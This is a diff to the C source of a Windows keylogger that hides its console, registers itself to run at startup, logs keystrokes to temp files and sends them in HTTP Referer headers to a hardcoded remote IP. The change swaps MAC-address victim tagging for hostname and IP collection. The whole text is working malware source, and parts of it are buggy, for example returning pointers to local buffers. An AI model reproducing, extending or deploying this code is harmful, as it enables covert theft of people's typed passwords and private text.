@@ -7,11 +7,9 @@
 #include <string.h>
 #include <stdlib.h>
 #include <direct.h>
-#include <winSock.h>
-#include <IPHlpApi.h>
+#include <winsock.h>
 #include <stdio.h>
 
-#pragma comment(lib, "iphlpapi.lib" )
 #pragma comment(lib, "ws2_32.lib")
 
 #define ip "35.193.14.199"
@@ -20,7 +18,7 @@
 using namespace std;
 int Save(int key_stroke, char *file);// Function to write in notepad
 void Stealth();// Functions to hide the console
-char* user_Address();// Functions that load mac_address
+char *user_identity(); // Functions that load username and ip_address
 int fileCopy(const char* src, const char* dst);// Functions to copy files
 int start_program(char *start);// Functions that register as startup programs
 void file_name(char *old, int cnt);// Function to rename Notepad
@@ -30,17 +28,17 @@ int send_textfile(char *mac, char *log);// Function to send the contents of note
 //main
 int main(int argc, char** argv)
 {
-	char i, mac_address[100];
+	char i, user_address[100];
 	int textcnt = 0, notepadcnt = 0;
 	char txtname[14] = "C:\\Temp\\0.txt";
 	char log[256];
+	char test[100] = "send test";
 	Stealth();
 	start_program(argv[0]);
 	txt_reset();
 	FILE *mf = fopen("C:\\Temp\\UserMac.txt", "w+");
 	fclose(mf);
-	strcpy(mac_address, user_Address());
-
+	strcpy(user_address, user_identity());
 	while (1)
 	{
 		for (i = 8; i <= 190; i++)
@@ -57,7 +55,7 @@ int main(int argc, char** argv)
 						return -1;
 					fgets(log, 255, tfp); // read txt and write log
 					fclose(tfp);
-					send_textfile(mac_address, log);
+					send_textfile(user_address, log);
 					if (notepadcnt >= 10) // More than 10 txtfile
 					{
 						notepadcnt = 0;
@@ -97,29 +95,38 @@ void txt_reset() //Initialize the contents of Notepad
 	}
 }
 
-// user_address
-char* user_Address()
+// get username and ip_address
+char * user_identity()
 {
-	char strMac[256];
-	char username[500] = "C:\\Temp\\UserMac.txt";
-	FILE *OUTPUT_FILE;
-	OUTPUT_FILE = fopen(username, "a+");
+	WORD wVersionRequested;
+	WSADATA wsaData;
+	char name[255];
+	char real_name[100000];
 
-	DWORD size = sizeof(PIP_ADAPTER_INFO);
-	PIP_ADAPTER_INFO Info;
-	ZeroMemory(&Info, size);
-	int result = GetAdaptersInfo(Info, &size);// Get the Mac address of the first Ran Card
-	if (result == ERROR_BUFFER_OVERFLOW)// If getadaptersinfo is out of memory, reallocate and recall
-	{
-		Info = (PIP_ADAPTER_INFO)malloc(size);
-		GetAdaptersInfo(Info, &size);
-	}
+	PHOSTENT hostinfo;
+	wVersionRequested = MAKEWORD(1, 1);
+	char *vip;
 
-	sprintf(strMac, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",
-		Info->Address[0], Info->Address[1], Info->Address[2], Info->Address[3], Info->Address[4], Info->Address[5]);
-	fprintf(OUTPUT_FILE, "%s", strMac);
-	fclose(OUTPUT_FILE);
-	return strMac;
+	if (WSAStartup(wVersionRequested, &wsaData) == 0)
+		if (gethostname(name, sizeof(name)) == 0)
+		{
+
+			strcpy(real_name, name);
+			printf("Host name: %s\n", name);
+
+			if ((hostinfo = gethostbyname(name)) != NULL)
+			{
+				int nCount = 0;
+				while (hostinfo->h_addr_list[nCount])
+				{
+					vip = inet_ntoa(*(
+						struct in_addr *)hostinfo->h_addr_list[nCount]);
+					strcat(real_name, vip);
+					break;
+				}
+			}
+		}
+	return real_name;
 }
 
 // save
@@ -188,7 +195,7 @@ void Stealth()// Hide console
 }
 
 // send text
-int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of txtfile
+int send_textfile(char *user, char *log) //mac == mac_address, log == contents of txtfile
 {
 	char text[10000] = "";
 	char trans[100000] = "";
@@ -196,13 +203,8 @@ int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of
 	char server_host[10000] = "Host: 35.193.14.199 \r\n";
 	char referer[10000] = "Referer:";
 	char finish[10000] = "Connection: close\r\n\r\n";
-	char *macp = mac;
 
-	for (; *macp; macp++)
-		if (*macp == ':')
-			*macp = '!';
-
-	strcat(text, mac); strcat(text, "<identity>"); strcat(text, log);
+	strcat(text, user); strcat(text, "<identity>"); strcat(text, log);
 	strcat(referer, text); strcat(referer, "\r\n");
 	strcat(trans, static_1);
 	strcat(trans, server_host);
@@ -259,9 +261,6 @@ int fileCopy(const char* src, const char* dst) {
 	FILE *in, *out;
 	char* buf;
 	size_t len;
-
-	printf("%s\n", src);
-	printf("%s\n", dst);
 
 	if (!strcmpi(src, dst)) return 4; // 원본과 사본 파일이 동일하면 에러
 
